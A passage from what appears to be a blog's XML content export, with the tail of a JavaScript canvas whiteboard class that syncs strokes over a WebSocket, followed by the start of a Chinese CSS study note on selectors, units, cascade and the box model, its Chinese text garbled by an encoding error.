class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.sendStrokes();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmouseleave = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.isDrawing = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">        <span class="comment">// éšè—æ©¡çš®æª«</span></span><br><span class="line">        <span class="keyword">this</span>.ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">        <span class="keyword">this</span>.repaint();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  showTextBox = <span class="function">(<span class="params">x, y</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> textElem = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>);</span><br><span class="line">    textElem.style.display = <span class="string">'block'</span>;</span><br><span class="line">    textElem.style.top = y + <span class="string">'px'</span>;</span><br><span class="line">    textElem.style.left = x + <span class="string">'px'</span>;</span><br><span class="line">    <span class="keyword">this</span>.textSite = &#123; x, y &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  showRubber = <span class="function">(<span class="params">x, y</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœæ˜¯æ©¡çš®æª«ï¼Œæ¸…ç©ºç”»å¸ƒï¼Œé‡ç»˜ï¼Œæ˜¾ç¤ºæ©¡çš®æª«</span></span><br><span class="line">    <span class="keyword">const</span> &#123; ctx &#125; = <span class="keyword">this</span>;</span><br><span class="line">    ctx.lineWidth = <span class="number">1</span>;</span><br><span class="line">    ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">    <span class="keyword">this</span>.repaint();</span><br><span class="line"></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.strokeStyle = <span class="string">'#000000'</span>;</span><br><span class="line">    <span class="keyword">const</span> size = <span class="number">2</span>;</span><br><span class="line">    ctx.moveTo(x - size * <span class="number">10</span> , y - size * <span class="number">10</span> );</span><br><span class="line">    ctx.lineTo(x + size * <span class="number">10</span> , y - size * <span class="number">10</span> );</span><br><span class="line">    ctx.lineTo(x + size * <span class="number">10</span> , y + size * <span class="number">10</span> );</span><br><span class="line">    ctx.lineTo(x - size * <span class="number">10</span> , y + size * <span class="number">10</span> );</span><br><span class="line">    ctx.lineTo(x - size * <span class="number">10</span> , y - size * <span class="number">10</span> );</span><br><span class="line">    ctx.stroke();</span><br><span class="line">  &#125;</span><br><span class="line">  sendStrokes = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.socket.send(<span class="built_in">JSON</span>.stringify(&#123; <span class="attr">kind</span>: <span class="number">1</span>, <span class="attr">points</span>: <span class="keyword">this</span>.strokes &#125;));</span><br><span class="line">  &#125;</span><br><span class="line">  addPoint = <span class="function">(<span class="params">x, y, newStroke, str</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> p = &#123; x, y &#125;;</span><br><span class="line">    <span class="keyword">const</span> &#123; graphType &#125; = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> d = &#123; <span class="attr">data</span>: [p], <span class="attr">text</span>: str, <span class="attr">strokeColor</span>: <span class="keyword">this</span>.strokeColor, <span class="attr">graphType</span>: <span class="keyword">this</span>.graphType &#125;;</span><br><span class="line">      <span class="keyword">this</span>.strokes.push(d);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newStroke) &#123;</span><br><span class="line">      <span class="keyword">const</span> d = &#123; <span class="attr">data</span>: [p], <span class="attr">strokeColor</span>: <span class="keyword">this</span>.strokeColor, <span class="attr">width</span>: <span class="keyword">this</span>.lineWidth, <span class="attr">graphType</span>: <span class="keyword">this</span>.graphType &#125;;</span><br><span class="line">      <span class="keyword">this</span>.strokes.push(d);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'pencil'</span> || graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.strokes[<span class="keyword">this</span>.strokes.length - <span class="number">1</span>].data.push(p);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'line'</span> || graphType === <span class="string">'circle'</span> || graphType === <span class="string">'square'</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.strokes[<span class="keyword">this</span>.strokes.length - <span class="number">1</span>].data[<span class="number">1</span>] = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.repaint();</span><br><span class="line">  &#125;</span><br><span class="line">  repaint = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// æ¸…ç©ºå†é‡ç»˜</span></span><br><span class="line">    repaint(<span class="keyword">this</span>.ctx, <span class="keyword">this</span>.strokes);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// è®¾ç½®ç”»ç¬”ç²—ç»†</span></span><br><span class="line">  setLineWidth = <span class="function">(<span class="params">width</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.lineWidth = width;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// è®¾ç½®ç±»å‹ &#123;pencil, line, circle, square, rubber, text&#125;</span></span><br><span class="line">  setGraphType = <span class="function">(<span class="params">graphType</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.graphType = graphType;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// è®¾ç½®ç”»ç¬”é¢œè‰²</span></span><br><span class="line">  setGraphColor = <span class="function">(<span class="params">color</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.strokeColor = color;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// æ¸…ç©º</span></span><br><span class="line">  clear = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.strokes = [];</span><br><span class="line">    <span class="keyword">this</span>.ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">    <span class="keyword">this</span>.sendStrokes();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// æ’¤é”€</span></span><br><span class="line">  cancelOneStep = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.strokes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.redo.push(<span class="keyword">this</span>.strokes[<span class="keyword">this</span>.strokes.length - <span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">this</span>.strokes.pop();</span><br><span class="line">      <span class="keyword">this</span>.repaint();</span><br><span class="line">      <span class="keyword">this</span>.sendStrokes();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// æ¢å¤ï¼šå†æ‰§è¡Œæœ€è¿‘ä¾æ¬¡æ“ä½œ</span></span><br><span class="line">  redoStep = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.redo.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.strokes.push(<span class="keyword">this</span>.redo[<span class="keyword">this</span>.redo.length - <span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">this</span>.redo.pop();</span><br><span class="line">      <span class="keyword">this</span>.repaint();</span><br><span class="line">      <span class="keyword">this</span>.sendStrokes();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientBoard</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(options) &#123;</span><br><span class="line">    <span class="keyword">this</span>.canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line">    <span class="keyword">this</span>.ctx = <span class="keyword">this</span>.canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">    <span class="keyword">const</span> &#123; wid, token &#125; = options;</span><br><span class="line">    <span class="keyword">const</span> ws = <span class="string">`ws://live.ngrok.elitemc.cn:8000/ws/whiteboard-<span class="subst">$&#123;wid&#125;</span>?token=<span class="subst">$&#123;token&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">this</span>.socket = <span class="keyword">new</span> WebSocket(ws);</span><br><span class="line">    <span class="keyword">this</span>.socket.onmessage = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> messages = event.data.split(<span class="string">'\n'</span>);</span><br><span class="line">      messages.map(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.onMessage(<span class="built_in">JSON</span>.parse(data));</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.socket.onopen = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// console.log(event);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  onMessage = <span class="function">(<span class="params">message</span>) =&gt;</span> &#123;</span><br><span class="line">    repaint(<span class="keyword">this</span>.ctx, message.points);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSSæ–‡æ¡£</title>
      <link href="/2018/10/06/CSS%E6%96%87%E6%A1%A3/"/>
      <url>/2018/10/06/CSS%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-åŸºç¡€"><a href="#1-åŸºç¡€" class="headerlink" title="1. åŸºç¡€"></a>1. åŸºç¡€</h3><p><img src="/2018/10/06/CSSæ–‡æ¡£/1.svg" style="padding-top:20px; max-width:500px"></p><h4 id="1-1-æµè§ˆå™¨æ ·å¼å‰ç¼€"><a href="#1-1-æµè§ˆå™¨æ ·å¼å‰ç¼€" class="headerlink" title="1.1 æµè§ˆå™¨æ ·å¼å‰ç¼€"></a>1.1 æµè§ˆå™¨æ ·å¼å‰ç¼€</h4><table><thead><tr><th>æµè§ˆå™¨åˆ†ç±»</th><th style="text-align:center">æµè§ˆå™¨</th><th style="text-align:right">ç§æœ‰å±æ€§çš„å‰ç¼€</th></tr></thead><tbody><tr><td>Geckoå¼•æ“å†…æ ¸çš„æµè§ˆå™¨</td><td style="text-align:center">Mozilla(Firefox)</td><td style="text-align:right">-moz-</td></tr><tr><td>Prestoå¼•æ“å†…æ ¸çš„æµè§ˆå™¨</td><td style="text-align:center">Opera</td><td style="text-align:right">-o-</td></tr><tr><td>KHTMLå¼•æ“å†…æ ¸çš„æµè§ˆå™¨</td><td style="text-align:center">Konqueror</td><td style="text-align:right">-khtml-</td></tr><tr><td>Tridentå¼•æ“å†…æ ¸çš„æµè§ˆå™¨</td><td style="text-align:center">Internet Explorer</td><td style="text-align:right">-ms- </td></tr><tr><td>Webkit</td><td style="text-align:center">Chrome, Safari</td><td style="text-align:right">-webkit-</td></tr></tbody></table><p><br></p><h4 id="1-2-é€‰æ‹©å™¨"><a href="#1-2-é€‰æ‹©å™¨" class="headerlink" title="1.2 é€‰æ‹©å™¨"></a>1.2 é€‰æ‹©å™¨</h4><p>æ ·å¼ç³»ç»Ÿä»å…³é”®é€‰æ‹©å™¨å¼€å§‹åŒ¹é…ï¼Œç„¶åå·¦ç§»æŸ¥æ‰¾è§„åˆ™é€‰æ‹©å™¨çš„ç¥–å…ˆå…ƒç´ ã€‚åªè¦é€‰æ‹©å™¨çš„å­æ ‘ä¸€ç›´åœ¨å·¥ä½œï¼Œæ ·å¼ç³»ç»Ÿå°±ä¼šæŒç»­å·¦ç§»ï¼Œç›´åˆ°å’Œè§„åˆ™åŒ¹é…ï¼Œæˆ–è€…æ˜¯å› ä¸ºä¸åŒ¹é…è€Œæ”¾å¼ƒè¯¥è§„åˆ™ã€‚</p><p>è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœé‡‡ç”¨ä»å·¦è‡³å³çš„æ–¹å¼è¯»å–CSSè§„åˆ™ï¼Œé‚£ä¹ˆå¤§å¤šæ•°è§„åˆ™è¯»åˆ°æœ€åï¼ˆæœ€å³ï¼‰æ‰ä¼šå‘ç°æ˜¯ä¸åŒ¹é…çš„ï¼Œè¿™æ ·åšä¼šè´¹æ—¶è€—èƒ½ï¼Œæœ€åæœ‰å¾ˆå¤šéƒ½æ˜¯æ— ç”¨çš„ï¼›</p><p>è€Œå¦‚æœé‡‡å–<em>ä»å³å‘å·¦çš„æ–¹å¼ï¼Œé‚£ä¹ˆåªè¦å‘ç°æœ€å³è¾¹é€‰æ‹©å™¨ä¸åŒ¹é…ï¼Œå°±å¯ä»¥ç›´æ¥èˆå¼ƒäº†ï¼Œé¿å…äº†è®¸å¤šæ— æ•ˆåŒ¹é…ã€‚</em></p><ul><li><p>å±æ€§é€‰æ‹©å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-quantity=&quot;1kg&quot; data-vegetable=&quot;not spicy like chili&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">[attr]       å…·æœ‰attrå±æ€§çš„å…ƒç´ </span><br><span class="line">[attr=val]   attrå±æ€§å€¼ä¸ºvalçš„å…ƒç´ </span><br><span class="line">[attr~=]     attrå±æ€§å€¼åŒ…å«valçš„å…ƒç´ </span><br><span class="line"></span><br><span class="line">[attr|=val]  attrå±æ€§å€¼æ˜¯ val æˆ–å€¼ä»¥ val- å¼€å¤´çš„å…ƒç´ </span><br><span class="line">[attr^=val]  attrå±æ€§å€¼ä»¥ val å¼€å¤´çš„å…ƒç´ </span><br><span class="line">[attr$=val]  attrå±æ€§å€¼ä»¥ val ç»“å°¾çš„å…ƒç´ </span><br><span class="line">[attr*=val]  attrå±æ€§å€¼åŒ…å« val çš„å…ƒç´ </span><br></pre></td></tr></table></figure></li><li><p>ä¼ªç±»é€‰æ‹©å™¨<br>ä¸€ä¸ªCSSä¼ªç±» æ˜¯ä¸€ä¸ªä»¥å†’å·(:)ä½œä¸ºå‰ç¼€ï¼Œè¢«æ·»åŠ åˆ°ä¸€ä¸ªé€‰æ‹©å™¨æœ«å°¾çš„å…³é”®å­—ã€‚å½“ä½ å¸Œæœ›æ ·å¼åœ¨ç‰¹å®šçŠ¶æ€ä¸‹æ‰å‘ˆç°ç‰¹å®šæ ·å¼ï¼Œä½ å¯ä»¥åœ¨è¯¥å…ƒç´ é€‰æ‹©å™¨ååŠ ä¸Šå¯¹åº”çš„ä¼ªç±»ã€‚</p></li></ul><table><thead><tr><th>ä¼ªç±»é€‰æ‹©å™¨</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>:active</td><td style="text-align:center">è¢«æ¿€æ´»çš„å…ƒç´ ï¼Œé€šå¸¸åŒ¹é…tabäº¤äº’ã€‚è¿™ä¸ªæ ·å¼å¯èƒ½ä¼šè¢«å…¶å®ƒä¼ªç±»è¦†ç›–ã€‚<br>é“¾æ¥ä¼ªç±»cssé¡ºåº<code>:link - :visited - :hover - :active</code></td></tr><tr><td>:visited</td><td style="text-align:center">è¢«è®¿é—®è¿‡çš„é“¾æ¥</td></tr><tr><td>:hover</td><td style="text-align:center">å…‰æ ‡æ‚¬åœ</td></tr><tr><td>:focus</td><td style="text-align:center">è·å¾—ç„¦ç‚¹çš„å…ƒç´ ã€‚ç”¨æˆ·ç‚¹å‡»ã€è§¦æ‘¸å…ƒç´ ï¼Œæˆ–é€šè¿‡é”®ç›˜tabé”®é€‰æ‹©å®ƒæ—¶ä¼šè§¦å‘ã€‚</td></tr><tr><td>:link</td><td style="text-align:center"><code>a:link</code>é€‰ä¸­å…ƒç´ å½“ä¸­çš„é“¾æ¥</td></tr><tr><td>:checked</td><td style="text-align:center">å¤„äºé€‰ä¸­çŠ¶æ€çš„radio, checkbox, æˆ–selectä¸­çš„optionå…ƒç´ </td></tr><tr><td>:disabled</td><td style="text-align:center">ä»»ä½•è¢«ç¦ç”¨çš„å…ƒç´ </td></tr><tr><td>:enabled</td><td style="text-align:center">ä»»ä½•å¯ç”¨çš„å…ƒç´ </td></tr><tr><td>:invalid</td><td style="text-align:center"><code>&lt;input&gt;</code>æˆ–å…¶å®ƒ<code>&lt;form&gt;å…ƒç´ </code>å†…å®¹æœªé€šè¿‡éªŒè¯ <code>&lt;input type=&quot;email&quot; /&gt;</code></td></tr><tr><td>:valid</td><td style="text-align:center"><code>&lt;input&gt;</code>æˆ–å…¶å®ƒ<code>&lt;form&gt;å…ƒç´ </code>å†…å®¹é€šè¿‡éªŒè¯ </td></tr><tr><td>:in-range</td><td style="text-align:center"><code>&lt;input&gt;</code>å½“å‰å€¼å¤„äºminå’ŒmaxèŒƒå›´å†…</td></tr><tr><td>:out-of-range</td><td style="text-align:center"><code>&lt;input&gt;</code>å½“å‰å€¼å¤„äºminå’ŒmaxèŒƒå›´å¤–</td></tr><tr><td>:read-only</td><td style="text-align:center">å…ƒç´ ä¸å¯è¢«ç”¨æˆ·ç¼–è¾‘çš„çŠ¶æ€</td></tr><tr><td>:read-wirte</td><td style="text-align:center">å¯è¢«ç”¨æˆ·ç¼–è¾‘</td></tr><tr><td>:required</td><td style="text-align:center">æ‹¥æœ‰requiredå±æ€§çš„<code>&lt;input&gt;&lt;select&gt;&lt;textarea&gt;</code>å…ƒç´ </td></tr><tr><td>:optional</td><td style="text-align:center">æ²¡æœ‰requiredå±æ€§çš„<code>&lt;input&gt;&lt;select&gt;&lt;textarea&gt;</code>å…ƒç´ </td></tr><tr><td>:empty</td><td style="text-align:center">æ²¡æœ‰å­å…ƒç´ çš„å…ƒç´ (å­å…ƒç´ å¯ä»¥æ˜¯å…ƒç´ èŠ‚ç‚¹ã€æ–‡æœ¬ã€ç©ºæ ¼)</td></tr><tr><td>:first-child</td><td style="text-align:center">ä¸€ç»„å…„å¼Ÿå…ƒç´ ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´  (:first-of-type)</td></tr><tr><td>:last-child</td><td style="text-align:center">ä¸€ç»„å…„å¼Ÿå…ƒç´ ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ </td></tr><tr><td>:not(selector)</td><td style="text-align:center"><code>p :not(div) :not(.fancy)</code> é<code>&lt;div&gt;</code>æˆ–ç±»åä¸æ˜¯<code>.fancy</code>çš„<code>&lt;p&gt;</code></td></tr><tr><td>:nth-child(an+b)</td><td style="text-align:center">é€‰æ‹©ç»“æœä¸ºç¬¬(an+b)ä¸ªå…ƒç´ çš„é›†åˆ(n=0,1,2â€¦)<br> <code>tr:nth-child(2n+1/2n) å¥‡æ•°/å¶æ•°è¡Œï¼›span:nth-child(-n+3) å‰ä¸‰ä¸ªå…ƒç´ </code></td></tr><tr><td>:root</td><td style="text-align:center">åŒ¹é…æ–‡æ¡£æ ‘çš„æ ¹å…ƒç´ ï¼Œè¡¨ç¤º<code>&lt;html&gt;</code>å…ƒç´ </td></tr><tr><td>:target</td><td style="text-align:center">IDä¸å½“å‰URLç‰‡æ®µåŒ¹é…ï¼Œå¦‚ <code>http://www.example.com#section2</code>; <br><code>&lt;section id=&quot;section2&quot;&gt;&lt;/section&gt;; :target{color:red}</code></td></tr><tr><td>:lang()</td><td style="text-align:center">åŸºäºå…ƒç´ è¯­è¨€æ¥åŒ¹é…é¡µé¢å…ƒç´ </td></tr><tr><td>@page:first</td><td style="text-align:center">æ‰“å°æ–‡æ¡£æ—¶ï¼Œç¬¬ä¸€é¡µçš„æ ·å¼ <code>@page:first{ margin-left: 50% }</code></td></tr></tbody></table><p><strong> :first-childä¸ç”Ÿæ•ˆï¼šä½¿ç”¨:first-childä¼ªç±»æ—¶ä¸€å®šè¦ä¿è¯å‰é¢æ²¡æœ‰å…„å¼ŸèŠ‚ç‚¹ã€‚</strong></p><ul><li>ä¼ªå…ƒç´  </li></ul><table><thead><tr><th>ä¼ªå…ƒç´ </th><th style="text-align:center"></th></tr></thead><tbody><tr><td>::after</td><td style="text-align:center">åˆ›å»ºä¸€ä¸ªä¼ªå…ƒç´ ï¼Œå…¶å°†æˆä¸ºå…ƒç´ çš„æœ€åä¸€ä¸ªå­å…ƒç´ ï¼Œé€šå¸¸ä¼šé…åˆcontentå±æ€§æ¥ä¸ºè¯¥å…ƒç´ æ·»åŠ è£…é¥°å†…å®¹ã€‚</td></tr><tr><td>::before</td><td style="text-align:center">åˆ›å»ºä¸€ä¸ªä¼ªå…ƒç´ ï¼Œå…¶å°†æˆä¸ºå…ƒç´ çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ ï¼Œé€šå¸¸ä¼šé…åˆcontentå±æ€§æ¥ä¸ºè¯¥å…ƒç´ æ·»åŠ è£…é¥°å†…å®¹ã€‚</td></tr><tr><td>::first-letter</td><td style="text-align:center">é€‰ä¸­è¯¥å—çº§å…ƒç´ ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå¹¶ä¸”æ–‡å­—æ‰€å¤„çš„è¡Œä¹‹å‰æ²¡æœ‰å…¶ä»–å†…å®¹(å¦‚å›¾ç‰‡æˆ–è¡¨æ ¼)</td></tr><tr><td>::first-line</td><td style="text-align:center">é€‰ä¸­è¯¥å—çº§å…ƒç´ çš„ç¬¬ä¸€è¡Œåº”ç”¨æ ·å¼</td></tr><tr><td>::selection</td><td style="text-align:center">åº”ç”¨äºæ–‡æ¡£ä¸­è¢«ç”¨æˆ·é«˜äº®çš„éƒ¨åˆ†ï¼ˆä½¿ç”¨é¼ æ ‡æˆ–å…¶ä»–è®¾å¤‡é€‰ä¸­çš„éƒ¨åˆ†ï¼‰</td></tr></tbody></table><ul><li>ç»„åˆå™¨</li></ul><table><thead><tr><th>ç»„åˆå™¨</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>A,B</td><td style="text-align:center">åŒ¹é…æ»¡è¶³Aæˆ–Bçš„ä»»æ„å…ƒç´ </td></tr><tr><td>A B</td><td style="text-align:center">åŒ¹é…Bå…ƒç´ ï¼ŒBæ˜¯Açš„åä»£èŠ‚ç‚¹</td></tr><tr><td>A &gt; B</td><td style="text-align:center">åŒ¹é…Bå…ƒç´ ï¼ŒBæ˜¯Açš„ç›´æ¥å­èŠ‚ç‚¹</td></tr><tr><td>A + B</td><td style="text-align:center">åŒ¹é…Bå…ƒç´ ï¼ŒABæœ‰ç›¸åŒçš„çˆ¶èŠ‚ç‚¹ï¼Œå¹¶ä¸”Bç´§è·Ÿåœ¨Açš„åé¢</td></tr><tr><td>A ~ B</td><td style="text-align:center">åŒ¹é…Bå…ƒç´ ï¼ŒABæœ‰ç›¸åŒçš„çˆ¶èŠ‚ç‚¹ï¼ŒBåœ¨Aä¹‹åï¼Œä½†ä¸ä¸€å®šç´§æŒ¨ç€A</td></tr></tbody></table><p><br></p><h4 id="1-3-å€¼å’Œå•ä½"><a href="#1-3-å€¼å’Œå•ä½" class="headerlink" title="1.3 å€¼å’Œå•ä½"></a>1.3 å€¼å’Œå•ä½</h4><table><thead><tr><th>å•ä½</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>px</td><td style="text-align:center">ç»å¯¹å•ä½</td></tr><tr><td>em</td><td style="text-align:center">1emä¸å½“å‰å…ƒç´ çš„å­—ä½“å¤§å°ç›¸åŒã€‚emå•ä½ä¼šç»§æ‰¿çˆ¶å…ƒç´ çš„å­—ä½“å¤§å°<strong>(æœ€å¸¸ç”¨çš„ç›¸å¯¹å•ä½)</strong></td></tr><tr><td>rem</td><td style="text-align:center">ä¸emç›¸ä¼¼ï¼Œä½†å®ƒæ€»æ˜¯ç­‰äºé»˜è®¤åŸºç¡€å­—ä½“å¤§å°çš„å°ºå¯¸ï¼Œç»§æ‰¿å°†ä¸èµ·ä½œç”¨</td></tr><tr><td>vw,vh</td><td style="text-align:center">è§†å£å®½åº¦çš„1/100å’Œè§†å£é«˜åº¦çš„1/100(ä¸è¢«å¹¿æ³›æ”¯æŒ)</td></tr><tr><td>ex,ch</td><td style="text-align:center">å°å†™xçš„é«˜åº¦å’Œæ•°å­—0çš„å®½åº¦(ä¸è¢«å¹¿æ³›æ”¯æŒ)</td></tr></tbody></table><p><em>æ— å•ä½çš„å€¼</em>: 0, line-height: 1.8, åŠ¨ç”»çš„æ•°å€¼, ç™¾åˆ†æ¯”, é¢œè‰²</p><p><br></p><h4 id="1-4-å±‚å å’Œç»§æ‰¿"><a href="#1-4-å±‚å å’Œç»§æ‰¿" class="headerlink" title="1.4 å±‚å å’Œç»§æ‰¿"></a>1.4 å±‚å å’Œç»§æ‰¿</h4><ul><li>!important &gt; è¡Œå†…æ ·å¼-1000 &gt; idé€‰æ‹©å™¨-100 &gt; ç±»é€‰æ‹©å™¨/å±æ€§é€‰æ‹©å™¨/ä¼ªç±»-10 &gt; å…ƒç´ é€‰æ‹©å™¨/ä¼ªå…ƒç´ -1</li><li>åé¢çš„è§„åˆ™ &gt; å‰é¢çš„è§„åˆ™</li><li>ç»§æ‰¿: inherit - ä¸çˆ¶å…ƒç´ ä¸€æ ·; initial - ä¸æµè§ˆå™¨é»˜è®¤æ ·å¼ä¸€æ ·; unset - é‡ç½®ä¸ºè‡ªç„¶å€¼; </li></ul><p><br></p><h4 id="1-5-ç›’æ¨¡å‹"><a href="#1-5-ç›’æ¨¡å‹" class="headerlink" title="1.5 ç›’æ¨¡å‹"></a>1.5 ç›’æ¨¡å‹</h4><p>æ¯ä¸ªå…ƒç´ è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªçŸ©å½¢çš„æ–¹æ¡†ï¼Œæ¡†çš„å†…å®¹ã€å†…è¾¹è·ã€è¾¹ç•Œã€å¤–è¾¹è·ä¸€å±‚å±‚æ„å»ºèµ·æ¥ã€‚æµè§ˆå™¨æ¸²æŸ“ç½‘é¡µå¸ƒå±€æ—¶ï¼Œä¼šç®—å‡ºæ¯ä¸ªæ¡†æ¯ä¸€å±‚è¦ç”¨ä»€ä¹ˆæ ·å¼ï¼Œä»¥åŠæ¡†æ”¾åœ¨å“ªé‡Œã€‚<br>ç›’å­å±æ€§: width, height, padding, margin, border, min-width, max-width, min-height, max-height</p><p><em><code>box-sizing</code></em></p><ul><li><p>content-box<br>W3Cæ ‡å‡†ç›’æ¨¡å‹: element width = border + padding + content width<br><img src="/2018/10/06/CSSæ–‡æ¡£/1.png"></p></li><li><p>border-box<br>IEç›’æ¨¡å‹: element width = content width(å†…å®¹å®½åº¦åŒ…å«äº†content widthï¼Œborder, padding, å»ºè®®ä½¿ç”¨)<br><img src="/2018/10/06/CSSæ–‡æ¡£/2.png"></p></li></ul><p><em><code>overflow</code></em><br>å½“ä½ è®¾ç½®äº†ä¸€ä¸ªæ¡†çš„å¤§å°ï¼Œå…è®¸çš„å¤§å°å¯èƒ½ä¸é€‚åˆæ”¾ç½®å†…å®¹ï¼Œè¿™ç§æƒ…å†µä¸‹å†…å®¹ä¼šä»ç›’å­æº¢æµã€‚ä½¿ç”¨overflowï¼Œæˆ–overflow-x,overflow-yæ¥æ§åˆ¶è¿™ç§æƒ…å†µã€‚<br>auto: &nbsp;&nbsp;&nbsp; æº¢æµçš„å†…å®¹è¢«éšè—ï¼Œå‡ºç°æ»šåŠ¨æ¡æ¥æŸ¥çœ‹<br>hidden: æº¢æµçš„å†…å®¹è¢«éšè—<br>visible: æº¢æµçš„å†…å®¹è¢«æ˜¾ç¤ºåœ¨ç›’å­çš„å¤–è¾¹ï¼ˆè¿™æ˜¯é»˜è®¤è¡Œä¸ºï¼‰<br>scroll: ä¸ç®¡å†…å®¹æœ‰æ²¡æœ‰æº¢å‡ºå®¹å™¨ï¼Œéƒ½ä¼šæ˜¾ç¤ºæ»šåŠ¨æ¡<br>no-display: å†…å®¹æº¢å‡ºå®¹å™¨æ—¶ï¼Œä¸æ˜¾ç¤ºå…ƒç´ ï¼Œç›¸å½“äºæ·»åŠ äº†display:none<br>no-content: å†…å®¹æº¢å‡ºå®¹å™¨æ—¶ï¼Œä¸æ˜¾ç¤ºå†…å®¹ï¼Œç›¸å½“äºæ·»åŠ äº†visibility:hidden</p><p><em><code>display</code></em><br>block:  å†…å®¹ç‹¬å ä¸€è¡Œï¼Œå¯ä»¥è®¾ç½®å®½é«˜<br>inline: ä¸å‘¨å›´çš„è¡Œå†…å…ƒç´ å‡ºç°åœ¨åŒä¸€è¡Œï¼Œè®¾ç½®å®½é«˜æ— æ•ˆï¼Œè®¾ç½®padding,margin,borderä¼šæ›´æ–°å‘¨å›´æ–‡å­—çš„ä½ç½®<br>inline-block: ä¸ä¼šç‹¬å ä¸€è¡Œï¼Œèƒ½è®¾ç½®å®½é«˜</p><p><br></p><h3 id="2-æ–‡å­—"><a href="#2-æ–‡å­—" class="headerlink" title="2. æ–‡å­—"></a>2. æ–‡å­—</h3><p><em><code>æ–‡å­—</code></em><br>color, font-family, font-size, line-height, letter-spacing(å­—æ¯é—´è·), 